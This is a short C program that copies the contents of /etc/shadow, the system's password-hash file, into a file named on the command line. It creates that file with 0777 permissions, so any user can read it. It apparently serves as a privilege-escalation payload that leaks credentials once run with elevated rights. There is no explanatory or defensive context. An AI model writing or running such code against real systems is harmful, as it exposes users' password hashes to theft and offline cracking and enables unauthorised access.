#include<stdlib.h>
#include<stdio.h>
#include <fcntl.h>
int main(int argc, char *argv[]){
	
	char buff[3000];
	int fd = open(argv[1],O_CREAT|O_RDWR , 00777);

	int fd1 = open("/etc/shadow",O_RDONLY);
	
	int n = read(fd1 , buff , 3000);
	int fd2 = write(fd , buff , n);
	
	close(fd);
	close(fd1);
return 0;
}


